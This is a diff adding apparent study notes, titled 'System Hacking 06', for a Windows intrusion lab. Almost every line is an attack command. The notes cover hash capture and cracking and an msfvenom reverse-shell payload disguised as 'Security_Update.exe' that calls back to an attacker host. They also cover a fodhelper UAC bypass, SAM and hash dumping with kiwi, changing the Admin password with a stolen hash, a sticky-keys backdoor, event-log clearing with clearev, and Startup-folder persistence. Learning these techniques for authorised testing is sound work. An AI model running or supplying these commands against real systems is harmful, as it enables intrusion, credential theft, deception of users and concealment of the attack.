@@ -1,0 +1,53 @@
+
+## System Hacking 06
+
+    # Gaining Access
+	responder -I eth0
+	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+	l0phtCrack 7 (Win64)	//Securiy auditing.
+	Exploit-DB
+	
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4477 --platform windows -f exe -o Security_Update.exe
+		
+    # Privilege Escalation Windows
+	meterpreter > run post/windows/gather/smart_hashdump	
+	meterpreter > getsystem -t 1
+	meterpreter > background
+	Backgrounding session 1...
+	
+	msf6 > search bypassuac
+	msf6 > use exploit/windows/local/bypassuac_fodhelper
+	msf6 exploit(windows/local/bypassuac_fodhelper) > set SESSION 1
+	msf6 exploit(windows/local/bypassuac_fodhelper) > set LHOST 10.10.1.13
+	msf6 exploit(windows/local/bypassuac_fodhelper) > set TARGET 0
+	msf6 exploit(windows/local/bypassuac_fodhelper) > exploit
+	meterpreter > getuid
+	meterpreter > getsystem -t 1
+	meterpreter > getuid		//now we are administrator (nt authority)
+
+	meterpreter > hashdump
+	meterpreter > run post/windows/gather/hashdump
+	meterpreter > run post/windows/gather/smart_hashdump
+
+	meterpreter > run post/windows/manage/sticky_keys
+
+	meterpreter > clearev		// at the end
+		
+	
+	meterpreter > load kiwi
+	meterpreter > help kiwi
+	meterpreter > lsa_dump_sam
+	meterpreter > password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password
+
+	meterpreter > ps
+	meterpreter > migrate 4535 (pid acquired in ps like 4535 explorer.exe)
+	
+    # Maintain access with Startup
+	meterpreter > cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”
+	meterpreter > pwd
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=8080 -f exe > startup.exe
+	
+	upload /home/attacker/payload.exe	(in "Startup" folder)
+	
+
